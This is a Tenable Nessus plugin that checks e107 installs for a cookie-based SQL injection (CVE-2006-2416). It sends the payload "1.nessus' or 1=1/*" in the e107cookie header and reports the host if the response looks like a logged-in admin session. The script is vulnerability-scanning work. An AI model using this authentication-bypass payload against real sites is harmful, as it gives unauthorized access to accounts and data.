#
# (C) Tenable Network Security
#


if (description)
{
  script_id(21555);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2006-2416");
  script_bugtraq_id(17966);
  script_xref(name:"OSVDB", value:"25521");

  script_name(english:"e107 cookie SQL Injection Vulnerability");
  script_summary(english:"Tries to bypass authentication in e107 with a special cookie");

  desc = "
Synopsis :

The remote web server contains a PHP script that is affected by a SQL
injection issue. 

Description :

The version of e107 installed on the remote host fails to sanitize
input to the application-specific cookie used for authentication. 
Provided PHP's 'magic_quotes_gpc' setting is disabled, an
unauthenticated attacker can leverage this issue to bypass
authentication and generally manipulate SQL queries. 

See also :

http://www.securityfocus.com/archive/1/433938/30/0/threaded
http://www.nessus.org/u?957c33df

Solution :

Upgrade to e107 version 0.7.4 or later.

Risk factor :

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("e107_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/e107"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the issue to bypass authentication.
  exploit = string("1.nessus' or 1=1/*");
  req = http_get(item:string(dir, "/news.php"), port:port);
  req = str_replace(
    string:req,
    find:"User-Agent:",
    replace:string(
      "Cookie: e107cookie=", urlencode(str:exploit), "\r\n",
      "User-Agent:"
    )
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if it looks like we are logged in.
  if (
    # 0.7.x
    'user.php?id.1">Profile</a>' >< res ||
    # 0.6.x
    "user.php?id.1'>Profile</a>" >< res
  )
  {
    security_warning(port);
    exit(0);
  }
}
